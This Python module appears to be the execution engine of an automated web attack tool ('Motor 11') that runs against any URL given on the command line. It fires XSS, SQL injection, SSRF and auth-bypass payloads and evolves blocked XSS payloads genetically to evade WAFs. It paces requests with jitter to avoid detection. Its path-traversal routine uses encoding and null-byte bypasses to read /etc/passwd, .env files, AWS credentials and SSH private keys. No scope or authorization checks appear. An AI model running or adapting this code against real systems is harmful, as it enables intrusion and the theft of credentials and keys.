        injection_payloads = [p for p in top_payloads if p["category"] in ("sqli_raw", "sqli_blind", "sqli_union", "sqli_error", "ssti_jinja", "ssti_ejs", "ssti_thymeleaf", "nosql_injection", "command_injection")]
        lfi_payloads = [p for p in top_payloads if p["category"] in ("lfi", "path_traversal")]
        infra_payloads = [p for p in top_payloads if p["category"] in ("ssrf", "ssrf_metadata", "open_redirect", "xxe", "prototype_pollution", "auth_bypass", "idor")]

        results: List[Dict] = []

        if lfi_payloads:
            self.log(f"  â”œâ”€ LFI SNIPER: {len(lfi_payloads)} payloads (avanÃ§ado)...", "error", "execute")
            lfi_results = await self._execute_lfi_advanced(lfi_payloads[:15], timing)
            results.extend(lfi_results)
            self.ml_selector.update_from_execution(lfi_results, context)

            for r in lfi_results:
                if r.get("success"):
                    mc = mc_simulator.simulate({"id": r.get("payload_id"), "vector": "lfi", "base_weight": r.get("confidence", 0.5)}, context)
                    fuzzy = fuzzy_engine.decide(prob=mc["success_probability"], data_value=r.get("value", 0), detection_risk=context["detection_rate"])
                    r["monte_carlo"] = mc
                    r["fuzzy_decision"] = fuzzy
                    self.log(f"  â”‚  â””â”€ LFI {r.get('target_path','')} â†’ {fuzzy['decision']} (p={mc['success_probability']:.2f}, val={r.get('value',0):.0f})", "error", "execute")

        if xss_payloads:
            self.log(f"  â”œâ”€ XSS PHASE: {len(xss_payloads)} payloads para teste browser-based...", "error", "execute")
            xss_results = await self._execute_xss_payloads(xss_payloads[:20], timing)
            results.extend(xss_results)

            success = [r for r in xss_results if r.get("success")]
            partial = [r for r in xss_results if r.get("reflected") and not r.get("success")]
            blocked = [r for r in xss_results if r.get("blocked")]

            self.log(
                f"  â”‚  â””â”€ XSS: {len(success)} confirmed, {len(partial)} reflected, {len(blocked)} blocked",
                "error" if success else "warn", "execute"
            )

            for s in success:
                self.bayesian.update_prior(s.get("vector", "xss"), True)
                self.dictionary.update_weight(s.get("payload_id", ""), True)
            for f in blocked:
                self.bayesian.update_prior(f.get("vector", "xss"), False)
                self.dictionary.update_weight(f.get("payload_id", ""), False)

            if partial and self.cycles_completed < self.max_cycles:
                self.log(f"  â”‚  â”œâ”€ {len(partial)} payloads reflected â†’ feeding Genetic Engine for mutation...", "warn", "execute")
                mutated = self._evolve_partial_payloads(partial)
                if mutated:
                    self.log(f"  â”‚  â””â”€ {len(mutated)} mutants generated for cycle {self.cycles_completed + 1}", "warn", "execute")
                    mutated_results = await self._execute_xss_payloads(mutated[:10], timing)
                    results.extend(mutated_results)
                    mut_success = [r for r in mutated_results if r.get("success")]
                    if mut_success:
                        self.log(f"  â”‚     â””â”€ GENETIC MUTATION SUCCESS: {len(mut_success)} XSS confirmed via evolved payloads!", "error", "execute")

        if injection_payloads:
            self.log(f"  â”œâ”€ INJECTION PHASE: {len(injection_payloads)} payloads para teste HTTP...", "warn", "execute")
            inj_results = await self._execute_http_payloads(injection_payloads[:15], timing)
            results.extend(inj_results)

            inj_success = [r for r in inj_results if r.get("success")]
            if inj_success:
                self.log(f"  â”‚  â””â”€ INJECTION: {len(inj_success)} confirmed!", "error", "execute")
                for s in inj_success:
                    self.bayesian.update_prior(s.get("vector", "sqli"), True)
                    self.dictionary.update_weight(s.get("payload_id", ""), True)

        if infra_payloads:
            self.log(f"  â”œâ”€ INFRA PHASE: {len(infra_payloads)} payloads para teste infra...", "warn", "execute")
            infra_results = await self._execute_http_payloads(infra_payloads[:10], timing)
            results.extend(infra_results)

            infra_success = [r for r in infra_results if r.get("success")]
            if infra_success:
                self.log(f"  â”‚  â””â”€ INFRA: {len(infra_success)} confirmed!", "error", "execute")

        self.execution_results = results
        self.cycles_completed += 1

        ml_stats = self.ml_selector.get_stats()
        self.log(
            f"  â”œâ”€ ML Stats: {ml_stats['total_experience']} trials, accuracy {ml_stats['accuracy']:.1%}, contexts {ml_stats['unique_contexts']}",
            "info", "execute"
        )

        self.emit("motor11_execute_complete", {
            "total_tests": len(results),
            "successes": len([r for r in results if r.get("success")]),
            "reflected": len([r for r in results if r.get("reflected")]),
            "blocked": len([r for r in results if r.get("blocked")]),
            "cycle": self.cycles_completed,
        })

        self.log(f"  â””â”€ EXECUTE COMPLETO  Ciclo {self.cycles_completed}/{self.max_cycles}", "error", "execute")
        return results

    async def _execute_xss_payloads(self, payloads: List[Dict], timing: Dict) -> List[Dict]:
        results = []
        driver = None

        try:
            from scanner.modules.browser_recon import create_driver
            driver = create_driver()
        except Exception as e:
            self.log(f"  â”‚  [!] Selenium unavailable: {e}  falling back to HTTP", "warn", "execute")
            return await self._execute_http_payloads(payloads, timing)

        try:
            for i, p in enumerate(payloads):
                canary = f"{self.CANARY_PREFIX}{uuid.uuid4().hex[:12]}"
                raw_payload = p["payload"].replace("{canary}", canary)

                test_url = self._build_test_url(raw_payload)
                result = {
                    "payload_id": p["id"],
                    "payload": raw_payload[:120],
                    "category": p["category"],
                    "vector": p["category"].split("_")[0] if "_" in p["category"] else p["category"],
                    "target_url": test_url,
                    "success": False,
                    "reflected": False,
                    "blocked": False,
                    "evidence": "",
                    "canary": canary,
                    "stealth": p.get("stealth_level", 0),
                    "adjusted_weight": p.get("adjusted_weight", 0),
                }

                try:
                    if timing.get("jitter"):
                        import random
                        delay = timing["delay"] * (0.5 + random.random())
                    else:
                        delay = timing["delay"]
                    await asyncio.sleep(delay)

                    driver.get(test_url)
                    await asyncio.sleep(1.5)

                    dom_check = driver.execute_script("return window.__MSE_XSS || window.__MSE || null")
                    if dom_check and canary in str(dom_check):
                        result["success"] = True
                        result["evidence"] = f"DOM variable confirmed: {dom_check}"
                        self._add_reasoning(f"XSS CONFIRMED via DOM: {p['id']} on {test_url}", "xss_confirmed")

                    if not result["success"]:
                        page_source = driver.page_source
                        if canary in page_source:
                            result["reflected"] = True
                            ctx_start = max(0, page_source.index(canary) - 40)
                            ctx_end = min(len(page_source), page_source.index(canary) + len(canary) + 40)
                            result["evidence"] = f"Reflected in source: ...{page_source[ctx_start:ctx_end]}..."

                    if not result["success"] and not result["reflected"]:
                        try:
                            logs = driver.get_log("browser")
                            for log_entry in logs:
                                msg = log_entry.get("message", "")
                                if canary in msg:
                                    result["success"] = True
                                    result["evidence"] = f"Console canary: {msg[:200]}"
                                    self._add_reasoning(f"XSS CONFIRMED via console: {p['id']}", "xss_confirmed")
                                    break
                                if log_entry.get("level") == "SEVERE" and any(k in msg.lower() for k in ["script", "csp", "blocked"]):
                                    result["blocked"] = True
                                    result["evidence"] = f"Blocked: {msg[:200]}"
                        except Exception:
                            pass

                    self.emit("motor11_test_result", {
                        "index": i + 1,
                        "total": len(payloads),
                        "payload_id": p["id"],
                        "category": p["category"],
                        "success": result["success"],
                        "reflected": result["reflected"],
                        "blocked": result["blocked"],
                        "target": test_url[:100],
                    })

                except Exception as e:
                    result["evidence"] = f"Error: {str(e)[:200]}"
                    self.log(f"  â”‚  [!] Test error {p['id']}: {str(e)[:100]}", "warn", "execute")

                results.append(result)

        finally:
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass

        return results

    async def _execute_http_payloads(self, payloads: List[Dict], timing: Dict) -> List[Dict]:
        import httpx

        results = []

        try:
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(10.0, connect=5.0),
                follow_redirects=True,
                verify=False,
                headers={"User-Agent": "MSE-Motor11/1.0"},
            ) as client:
                for i, p in enumerate(payloads):
                    canary = f"{self.CANARY_PREFIX}{uuid.uuid4().hex[:12]}"
                    raw_payload = p["payload"].replace("{canary}", canary)

                    result = {
                        "payload_id": p["id"],
                        "payload": raw_payload[:120],
                        "category": p["category"],
                        "vector": p["category"].split("_")[0] if "_" in p["category"] else p["category"],
                        "target_url": self.target,
                        "success": False,
                        "reflected": False,
                        "blocked": False,
                        "evidence": "",
                        "canary": canary,
                        "status_code": 0,
                        "response_time_ms": 0,
                    }

                    try:
                        if timing.get("jitter"):
                            import random
                            delay = timing["delay"] * (0.5 + random.random())
                        else:
                            delay = timing["delay"]
                        await asyncio.sleep(delay)

                        params_to_test = self.consolidated_intel.get("parameters", []) or ["q", "search", "query", "id"]

                        for param in params_to_test[:3]:
                            test_url = f"{self.target}?{param}={raw_payload}"
                            start_time = time.time()

                            try:
                                resp = await client.get(test_url)
                                elapsed = (time.time() - start_time) * 1000
                                result["status_code"] = resp.status_code
                                result["response_time_ms"] = round(elapsed)
                                result["target_url"] = test_url[:200]

                                body = resp.text

                                if resp.status_code == 403:
                                    result["blocked"] = True
                                    result["evidence"] = f"403 Forbidden on {param}"
                                    break

                                if canary in body:
                                    result["reflected"] = True
                                    result["evidence"] = f"Reflected in response body via param {param}"

                                detection = p.get("detection", "")
                                if detection.startswith("regex:"):
                                    pattern = detection.replace("regex:", "")
                                    if re.search(re.escape(pattern), body):
                                        result["success"] = True
                                        result["evidence"] = f"Detection pattern '{pattern}' found in response"
                                        self._add_reasoning(f"INJECTION CONFIRMED: {p['id']} via {param}", "injection_confirmed")
                                        break

                                if detection == "error_based":
                                    error_patterns = [
                                        r"SQL syntax", r"mysql_", r"ORA-\d{5}", r"PG::SyntaxError",
                                        r"SQLSTATE", r"Unclosed quotation", r"unterminated",
                                        r"You have an error in your SQL",
                                    ]
                                    for ep in error_patterns:
                                        if re.search(ep, body, re.I):
                                            result["success"] = True
                                            result["evidence"] = f"SQL error pattern found: {ep}"
                                            self._add_reasoning(f"SQLi ERROR CONFIRMED: {p['id']} via {param}", "sqli_confirmed")
                                            break
                                    if result["success"]:
                                        break

                                if detection == "time_based" and elapsed > 2500:
                                    result["success"] = True
                                    result["evidence"] = f"Time-based: {elapsed:.0f}ms response (expected >2500ms)"
                                    self._add_reasoning(f"TIME-BASED CONFIRMED: {p['id']} via {param} ({elapsed:.0f}ms)", "timing_confirmed")
                                    break

                                if detection == "auth_bypass" and resp.status_code == 200:
                                    if any(kw in body.lower() for kw in ["dashboard", "admin", "welcome", "logout"]):
                                        result["success"] = True
                                        result["evidence"] = f"Auth bypass indicators found"
                                        break

                                if detection == "ssrf_response":
                                    if any(kw in body.lower() for kw in ["ami-id", "instance-id", "meta-data", "127.0.0.1", "localhost"]):
                                        result["success"] = True
                                        result["evidence"] = f"SSRF response indicators found"
                                        self._add_reasoning(f"SSRF CONFIRMED: {p['id']} via {param}", "ssrf_confirmed")
                                        break

                            except httpx.TimeoutException:
                                if p.get("detection") == "time_based":
                                    result["success"] = True
                                    result["evidence"] = "Timeout  possible time-based injection"
                            except Exception as he:
                                result["evidence"] = f"HTTP error: {str(he)[:100]}"

                    except Exception as e:
                        result["evidence"] = f"Error: {str(e)[:200]}"

                    self.emit("motor11_test_result", {
                        "index": i + 1,
                        "total": len(payloads),
                        "payload_id": p["id"],
                        "category": p["category"],
                        "success": result["success"],
                        "reflected": result["reflected"],
                        "blocked": result["blocked"],
                    })

                    results.append(result)

        except Exception as e:
            self.log(f"  [!] HTTP client error: {str(e)[:200]}", "warn", "execute")

        return results

    def _build_test_url(self, payload: str) -> str:
        params = self.consolidated_intel.get("parameters", [])
        test_param = params[0] if params else "q"
        from urllib.parse import quote
        encoded = quote(payload, safe="")
        base = self.target.rstrip("/")
        if "?" in base:
            return f"{base}&{test_param}={encoded}"
        return f"{base}?{test_param}={encoded}"

    def _evolve_partial_payloads(self, partial_results: List[Dict]) -> List[Dict]:
        base_payloads = [r["payload"] for r in partial_results if r.get("reflected")]
        if not base_payloads:
            return []

        genetic = GeneticPayloadEngine(base_payloads=base_payloads)

        responses = []
        for r in partial_results:
            responses.append({
                "status_code": 200,
                "detected_vuln": False,
                "waf_bypassed": r.get("reflected", False),
                "error_leaked": False,
                "response_time_ms": 500,
            })

        evolved = genetic.evolve(responses)

        mutated_payloads = []
        for org in evolved[:10]:
            canary_placeholder = "{canary}"
            raw = org.raw
            if "MSE_M11_" in raw:
                raw = re.sub(r'MSE_M11_[a-f0-9]+', canary_placeholder, raw)
            elif "__MSE" not in raw and canary_placeholder not in raw:
                if "<script>" in raw.lower():
                    raw = raw.replace("</script>", f';window.__MSE="{canary_placeholder}"</script>')
                elif "onerror" in raw.lower() or "onload" in raw.lower():
                    raw = re.sub(r'(onerror|onload)="([^"]*)"', rf'\1="window.__MSE=\'{canary_placeholder}\'"', raw)

            mutated_payloads.append({
                "id": f"gen_{org.id}",
                "payload": raw,
                "category": "xss_genetic_mutant",
                "context": ["input", "url_param"],
                "stealth_level": 0.6,
                "waf_bypass_prob": 0.7,
                "severity": "critical",
                "detection": "dom_variable",
                "base_weight": 0.6,
                "adjusted_weight": org.fitness / 100 if org.fitness > 0 else 0.5,
                "success_count": 0,
                "fail_count": 0,
            })

        self.consolidated_intel["genetic_report"] = genetic.generate_report()
        return mutated_payloads

    def _calculate_timing(self) -> Dict:
        block_rate = self.consolidated_intel.get("block_rate", 0)
        waf_strength = self.consolidated_intel.get("waf_strength", "unknown")

        if waf_strength == "strong" or block_rate > 0.7:
            return {"delay": 3.0, "max_rpm": 10, "jitter": True}
        elif waf_strength == "medium" or block_rate > 0.3:
            return {"delay": 1.5, "max_rpm": 20, "jitter": True}
        elif waf_strength == "weak":
            return {"delay": 0.8, "max_rpm": 40, "jitter": True}
        else:
            return {"delay": 0.5, "max_rpm": 60, "jitter": False}

    def _add_reasoning(self, message: str, category: str):
        entry = {
            "timestamp": time.time(),
            "time_str": time.strftime("%H:%M:%S"),
            "message": message,
            "category": category,
            "cycle": self.cycles_completed,
        }
        self.reasoning_trace.append(entry)
        self.emit("motor11_reasoning", entry)

    def generate_report(self) -> Dict:
        total_tests = len(self.execution_results)
        successes = [r for r in self.execution_results if r.get("success")]
        reflected = [r for r in self.execution_results if r.get("reflected") and not r.get("success")]
        blocked = [r for r in self.execution_results if r.get("blocked")]

        success_by_category: Dict[str, int] = {}
        for s in successes:
            cat = s.get("category", "unknown")
            success_by_category[cat] = success_by_category.get(cat, 0) + 1

        report = {
            "motor": "MOTOR_11_AUTONOMOUS_CONSOLIDATOR",
            "target": self.target,
            "duration_seconds": round(time.time() - self.started_at, 2),
            "cycles_completed": self.cycles_completed,
            "dictionary_total": self.dictionary.get_total_count(),
            "consolidated_sources": {
                "findings_ingested": len(self.consolidated_intel["all_findings"]),
                "probes_ingested": len(self.consolidated_intel["all_probes"]),
                "tech_stack": self.consolidated_intel["tech_stack"],
                "waf_type": self.consolidated_intel["waf_type"],
                "waf_strength": self.consolidated_intel["waf_strength"],
                "risk_score": self.consolidated_intel["risk_score"],
                "parameters_discovered": len(self.consolidated_intel["parameters"]),
                "credentials_found": len(self.consolidated_intel["credentials"]),
                "session_tokens_found": len(self.consolidated_intel["session_tokens"]),
            },
            "execution_summary": {
                "total_tests": total_tests,
                "confirmed_vulns": len(successes),
                "reflected_only": len(reflected),
                "blocked_by_waf": len(blocked),
                "success_rate": round(len(successes) / max(1, total_tests), 4),
                "by_category": success_by_category,
            },
            "confirmed_vulnerabilities": [
                {
                    "payload_id": s["payload_id"],
                    "category": s["category"],
                    "payload": s["payload"],
                    "target_url": s.get("target_url", ""),
                    "evidence": s.get("evidence", ""),
                }
                for s in successes
            ],
            "bayesian_final_state": self.bayesian.generate_report(),
            "genetic_report": self.consolidated_intel.get("genetic_report", {}),
            "reasoning_trace": self.reasoning_trace[-50:],
            "dictionary_report": self.dictionary.generate_report(),
        }

        return report

    async def execute_full_cycle(self,
                                  findings: List = None,
                                  probes: List = None,
                                  hypothesis: Dict = None,
                                  ghost_recon: Dict = None,
                                  decision_intel: Dict = None,
                                  adversarial_report: Dict = None,
                                  chain_intel: Dict = None,
                                  hacker_reasoning: Dict = None,
                                  incident_evidence: Dict = None,
                                  risk_score: float = 0.0,
                                  auto_dump_triggered: bool = False,
                                  sniper_decision: Dict = None,
                                  enterprise_dossier: Dict = None,
                                  persistence_assessment: Dict = None) -> Dict:

        self.log("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—", "error", "motor11")
        self.log("â•‘  MOTOR 11  AUTONOMOUS CONSOLIDATOR ENGINE ACTIVATED       â•‘", "error", "motor11")
        self.log(f"â•‘  Target: {self.target[:50]:<50}  â•‘", "error", "motor11")
        self.log(f"â•‘  Dictionary: {self.dictionary.get_total_count()} payloads | Max Cycles: {self.max_cycles}             â•‘", "error", "motor11")
        self.log("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•", "error", "motor11")

        self.ingest_pipeline_data(
            findings=findings,
            probes=probes,
            hypothesis=hypothesis,
            ghost_recon=ghost_recon,
            decision_intel=decision_intel,
            adversarial_report=adversarial_report,
            chain_intel=chain_intel,
            hacker_reasoning=hacker_reasoning,
            incident_evidence=incident_evidence,
            risk_score=risk_score,
            auto_dump_triggered=auto_dump_triggered,
            sniper_decision=sniper_decision,
            enterprise_dossier=enterprise_dossier,
            persistence_assessment=persistence_assessment,
        )

        correlation = await self.correlate()

        results = await self.execute_autonomous_v2(correlation)

        report = self.generate_report()

        self.log("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—", "error", "motor11")
        self.log(f"â•‘  MOTOR 11 COMPLETE  {report['execution_summary']['confirmed_vulns']} CONFIRMED VULNS                      â•‘", "error", "motor11")
        self.log(f"â•‘  Tests: {report['execution_summary']['total_tests']} | Success Rate: {report['execution_summary']['success_rate']:.1%}                      â•‘", "error", "motor11")
        self.log(f"â•‘  Duration: {report['duration_seconds']}s | Cycles: {report['cycles_completed']}                           â•‘", "error", "motor11")
        self.log("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•", "error", "motor11")

        self.emit("motor11_report", report)
        return report


    async def _execute_lfi_advanced(self, payloads: List[Dict], timing: Dict) -> List[Dict]:
        """Execucao avancada de LFI/Path Traversal com bypasses e analise semantica."""
        import httpx

        lfi_bypasses = [
            {"name": "double_url_encode", "transform": lambda p: p.replace("/", "%252f").replace(".", "%252e")},
            {"name": "null_byte", "transform": lambda p: p + "%00"},
            {"name": "path_truncation", "transform": lambda p: p[:100] + "/./././././." * 5 + "/" + p.split("/")[-1]},
            {"name": "php_filter", "transform": lambda p: f"php://filter/convert.base64-encode/resource={p}"},
        ]

        lfi_targets = [
            {"path": "../../../etc/passwd", "detect": ["root:", "nobody:", "daemon:"], "value": 50, "category": "system_file"},
            {"path": "../../../etc/hosts", "detect": ["localhost", "127.0.0.1"], "value": 30, "category": "network_config"},
            {"path": "../../../proc/self/environ", "detect": ["PATH=", "USER=", "HOME=", "PWD="], "value": 200, "category": "environment_vars"},
            {"path": "../../../.env", "detect": ["APP_ENV", "DATABASE_URL", "SECRET_KEY", "AWS_"], "value": 1000, "category": "env_file"},
            {"path": "../../../wp-config.php", "detect": ["DB_NAME", "DB_PASSWORD", "wp_"], "value": 800, "category": "wp_config"},
            {"path": "../../../.git/config", "detect": ["[core]", "remote", "url ="], "value": 500, "category": "git_config"},
            {"path": "../../../.aws/credentials", "detect": ["aws_access_key_id", "aws_secret_access_key"], "value": 2000, "category": "aws_credentials"},
            {"path": "../../../.ssh/id_rsa", "detect": ["BEGIN RSA PRIVATE KEY", "END RSA PRIVATE KEY"], "value": 5000, "category": "ssh_key"},
        ]

        lfi_params = ["file", "path", "document"]
        lfi_endpoints = ["/download", "/file", "/read"]

        results: List[Dict] = []
        base_url = self.target.rstrip("/")

        async with httpx.AsyncClient(timeout=httpx.Timeout(10.0, connect=5.0), follow_redirects=True, verify=False) as client:
            for target in lfi_targets:
                for bypass in lfi_bypasses:
                    transformed_path = bypass["transform"](target["path"])
                    for param in lfi_params:
                        for endpoint in lfi_endpoints:
                            url = f"{base_url}{endpoint}?{param}={transformed_path}"

                            await asyncio.sleep(timing["delay"] * (0.5 + random.random()) if timing.get("jitter") else timing["delay"])

                            try:
                                start = time.time()
                                resp = await client.get(url)
                                elapsed = int((time.time() - start) * 1000)

                                analysis = self._analyze_lfi_response(resp.text, target["detect"], target["category"])

                                results.append({
                                    "payload_id": f"lfi_{target['category']}",
                                    "payload": transformed_path[:200],
                                    "category": "lfi",
                                    "vector": "path_traversal",
                                    "target_url": url,
                                    "target_path": target["path"],
                                    "success": analysis["success"],
                                    "reflected": analysis["reflected"],
                                    "blocked": resp.status_code in (403, 429, 503),
                                    "evidence": analysis["evidence"][:500],
                                    "status_code": resp.status_code,
                                    "response_time_ms": elapsed,
                                    "data_type": analysis["data_type"],
                                    "confidence": analysis["confidence"],
                                    "value": target["value"] * analysis["confidence"],
                                    "bypass_used": bypass["name"],
                                    "timestamp": time.time(),
                                })

                                if analysis["success"]:
                                    self.log(f"[LFI-SNIPER] {bypass['name']} -> {target['path']} (conf {analysis['confidence']:.1%})", "error", "motor11")
                                elif analysis["reflected"]:
                                    self.log(f"[LFI-SNIPER] {bypass['name']} reflected {target['path']}", "warn", "motor11")
                            except Exception as e:
                                self.log(f"[LFI-SNIPER] erro: {str(e)[:120]}", "debug", "motor11")

        return results

    def _analyze_lfi_response(self, body: str, detect_patterns: List[str], category: str) -> Dict:
        result = {"success": False, "confidence": 0.0, "evidence": "", "reflected": False, "data_type": category}

        if any(tok in body for tok in ["../", "etc/", "proc/"]):
            result["reflected"] = True

        matches = []
        lower_body = body.lower()
        for pat in detect_patterns:
            if pat.lower() in lower_body:
                matches.append(pat)

        if len(matches) >= 2:
            result["success"] = True
            base_conf = 0.7 + 0.1 * min(3, len(matches))
            result["confidence"] = min(base_conf, 0.98)
            evidence_lines = []
            for line in body.splitlines()[:15]:
                if any(p.lower() in line.lower() for p in detect_patterns):
                    evidence_lines.append(line.strip())
            result["evidence"] = "\n".join(evidence_lines[:5])
        elif result["reflected"]:
            result["confidence"] = 0.3

        return result


async def run_standalone(target: str):
    engine = AutonomousConsolidator(target)

    m11_log(f"[STANDALONE] Motor 11 running standalone against: {target}", "error", "standalone")

    import httpx
    try:
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(10.0, connect=5.0),
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "MSE-Motor11/1.0"},
        ) as client:
            resp = await client.get(target)
            body = resp.text

            tech_stack = []
            if "react" in body.lower() or "__NEXT_DATA__" in body:
                tech_stack.append("react")
            if "ng-" in body or "angular" in body.lower():
                tech_stack.append("angular")
            if "vue" in body.lower() or "__vue__" in body:
                tech_stack.append("vue")
            if "jquery" in body.lower():
                tech_stack.append("jquery")
            if "wp-content" in body or "wordpress" in body.lower():
                tech_stack.append("wordpress")

            server = resp.headers.get("server", "").lower()
            if "express" in server or "node" in server:
                tech_stack.append("express")
            elif "apache" in server:
                tech_stack.append("php")
            elif "nginx" in server:
                tech_stack.append("nginx")

            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(target)
            params = list(parse_qs(parsed.query).keys())

            hypothesis = {
                "detected_stacks": tech_stack,
                "waf_vendor": resp.headers.get("x-powered-by", "unknown"),
                "waf_strength": "unknown",
            }

            findings = []
            probes = [{"url": target, "status": resp.status_code, "response_headers": dict(resp.headers)}]

            if params:
                engine.consolidated_intel["parameters"] = params

    except Exception as e:
        m11_log(f"[STANDALONE] Initial recon failed: {e}", "warn", "standalone")
        hypothesis = {"detected_stacks": [], "waf_vendor": "unknown", "waf_strength": "unknown"}
        findings = []
        probes = []

    report = await engine.execute_full_cycle(
        findings=findings,
        probes=probes,
        hypothesis=hypothesis,
    )

    m11_emit("MOTOR11_FINAL_REPORT", report)
    return report


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: python3 -m scanner.autonomous_engine <target_url>"}), flush=True)
        sys.exit(1)

    target = sys.argv[1]
    asyncio.run(run_standalone(target))

